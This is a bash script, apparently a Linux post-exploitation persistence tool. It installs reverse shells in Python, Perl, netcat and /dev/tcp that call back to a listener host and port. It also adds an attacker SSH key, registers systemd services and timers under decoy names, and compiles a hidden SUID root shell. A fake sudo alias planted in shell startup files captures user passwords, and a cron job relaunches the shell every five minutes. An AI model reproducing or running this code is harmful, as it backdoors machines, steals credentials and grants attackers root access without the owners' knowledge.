#!/bin/bash

PUBKEY="ssh-rsa AAAADAQABAAABAQKIPelAdy/6YG8zWMc1YZXYf9boIZz2v48aq9BSVr3vBMhUj02Du6TZ2BMckLqGa4lqCIkfTlZ4Zk"
LHOST="192.168.122.1"
PORT="4242"

function reverse_shells(){
echo "[+] installing reverse shells executable"

cat << EOF > "${REVSHELLSPATH}"
#!/bin/bash
if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("$LHOST",$PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;\$i="$LHOST";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        exit;
fi

if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $PORT >/tmp/f
        exit;
fi

if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/$LHOST/$PORT 0>&1
        exit;
fi
EOF
chmod +x "${REVSHELLSPATH}"
}

function add_key(){

	echo "[+] adding ssh key"
	if [ ! -f "$HOME"/.ssh/authorized_keys ];then mkdir "$HOME"/.ssh ;fi
	echo "$PUBKEY" >> "$HOME"/.ssh/authorized_keys;

}

function install_user_systemd(){
if ! command -v systemctl &> /dev/null; then 
	echo "[-] systemctl command not found" && return 1; 
fi

echo "[+] installing systemd timer for user $USER"
mkdir -p "$HOME"/.config/systemd/user/

cat << EOF > "$HOME"/.config/systemd/user/serial.service
[Unit]
Description=Serial

[Service]
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$PORT 0>&1'
Restart=always
RestartSec=300

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user start serial.service
systemctl --user enable serial.service

}

function install_systemd_timer(){
if ! command -v systemctl &> /dev/null; then 
	echo "[-] systemctl command not found" && return 1; 
fi

echo "[+] installing systemd timer"

cat << EOF > /etc/systemd/system/upowrd.service
[Unit]
Description=server
After=network.target auditd.service
Wants=upowrd.timer

[Service]
Type=oneshot
ExecStart=/var/log/upowrd

[Install]
WantedBy=multi-user.target
EOF

cat << EOF > /etc/systemd/system/upowrd.timer
[Unit]
Description=system statistics
Requires=upowrd.service

[Timer]
Unit=upowrd.service
OnCalendar=*:0,5,10,15,20,25,30,35,40,45,50,55

[Install]
WantedBy=timers.target
EOF

systemctl enable upowrd
systemctl enable upowrd.timer
systemctl start upowrd.timer
}	

function make_suid_bin(){
if ! command -v gcc &> /dev/null; then
	echo "[-] gcc command not found"
	return 1
fi
 
echo "[+] creating SUID binary"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > /var/log/.auditd.c
gcc /var/log/.auditd.c -o /var/log/.auditd 2>/dev/null
rm /var/log/.auditd.c
chown root:root /var/log/.auditd
chmod 4777 /var/log/.auditd
}

function backdoor_bashrc_privesc(){
echo "[+] adding sudo backdoor on $USER .bashrc"
cat << EOF > /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s

alias sudo='[ -f "/tmp/.systemd-private-b21245afee3b3274d4b2e21" ] && \$(sed -i "/sudo/d" \$HOME/.bashrc) ; locale=\$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale = "pt" ]; then echo -n "[sudo] senha para \$USER: ";fi;if [ \$locale = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; echo "\$pwd" > \$HOME/.local/share/.not_the_root_passwd ; touch /tmp/.systemd-private-b21245afee3b3274d4b2e21 ; echo "\$pwd" | /usr/bin/sudo -S chmod u+s \$(which python) > \$HOME/.local/share/.log 2>/dev/null &&/usr/bin/sudo -S '
EOF
#alias sudo='[ -f "/tmp/.systemd-private-b21245afee3b3274d4b2e21" ] && $(sed -i "/sudo/d" $HOME/.bashrc) ; locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ $locale = "en" ]; then echo -n "[sudo] password for $USER: ";fi;if [ $locale = "pt" ]; then echo -n "[sudo] senha para $USER: ";fi;if [ $locale = "fr" ]; then echo -n "[sudo] Mot de passe de $USER: ";fi;read -s pwd;echo;echo "$pwd" > $HOME/.local/share/.not_the_root_passwd ; touch /tmp/.systemd-private-b21245afee3b3274d4b2e21 ; echo "$pwd" | /usr/bin/sudo -S chmod u+s $(which python) > $HOME/.local/share/.uidcreated 2>/dev/null &&/usr/bin/sudo -S '


if [ -f ~/.bashrc ]; then
    cat /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s >> ~/.zshrc
fi
rm -f /tmp/.systemd-private-b21245af9d0zcnw9c8j4l3s
}

function add_cronjob(){
if ! command -v crontab &> /dev/null; then
	echo "[-] crontab command not found"
	return 1
fi
echo "[+] adding crontab"
crontab -l | { cat; echo "*/5 * * * * /bin/bash ${REVSHELLSPATH}"; } | crontab -
}

if [ "$EUID" -eq 0 ]; then
	REVSHELLSPATH="/var/log/upowrd"
	reverse_shells
	add_key
	install_systemd_timer
	make_suid_bin
fi
echo "Adding persistences to $USER..."
mkdir -p "$HOME"/.local/share 2>/dev/null
REVSHELLSPATH="$HOME/.local/share/upowrd"
reverse_shells
install_user_systemd
backdoor_bashrc_privesc
add_key
add_cronjob

